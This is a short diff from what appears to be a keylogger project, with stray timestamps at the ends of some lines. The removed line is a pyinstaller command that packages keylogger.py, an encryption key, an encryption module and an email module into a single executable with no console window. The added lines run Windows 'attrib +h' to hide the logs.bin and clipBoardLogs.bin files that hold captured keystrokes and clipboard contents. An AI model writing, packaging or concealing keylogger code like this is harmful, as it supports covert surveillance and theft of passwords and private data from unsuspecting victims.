@@ -1,2 +1,4 @@
-pyinstaller --onefile --noconsole --add-data "encryption_key.bin;." --add-data "encryption.py;." --add-data "emailFunctionality.py;." keylogger.py
-     15:13:54 31-10-2024
+        if os.path.exists("logs.bin"):
+            os.system(f'attrib +h "{"logs.bin"}"')
+        if os.path.exists("clipBoardLogs.bin"):
+            os.system(f'attrib +h "{"clipBoardLogs.bin"}"')     17:56:49 31-10-2024
